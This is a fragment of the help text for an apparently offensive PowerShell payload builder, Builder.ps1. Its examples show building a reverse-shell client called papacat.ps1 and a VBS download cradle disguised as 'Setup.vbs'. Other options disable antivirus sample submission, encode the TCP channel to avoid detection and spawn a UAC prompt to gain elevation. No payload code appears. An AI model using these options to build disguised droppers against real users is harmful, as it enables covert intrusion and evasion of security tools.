...
.NOTES
   ...
   Parameter -force 'true' disable AV samples submition and encodes tcp data
   flow between client and server if invoked together with -action 'rawcat'.
...
.Parameter Force
   Disable AV sample submition (default: false) and
   Encodes tcp data flow if invoked -action 'rawcat'
...
.EXAMPLE
   PS C:\> .\Builder.ps1 -action "rawcat" -force "true" -PayloadPort "666" -VbsName "Setup"
   Use papacat.ps1 as client (payload), with '666' payload port, disable av samples submition,
   encode tcp data flow between channels (client\server) and create Setup.vbs download crandle.

.EXAMPLE
   PS C:\> .\Builder.ps1 -action "rawcat" -force "true" -Elevate "true" -VbsName "Setup"
   Use papacat.ps1 as client (payload), disable av samples submition, encode tcp data flow
   between channels, Spawn UAC gui to run elevated and create Setup.vbs download crandle.
...
$CmdletVersion = "v2.1.9" #CmdLet version
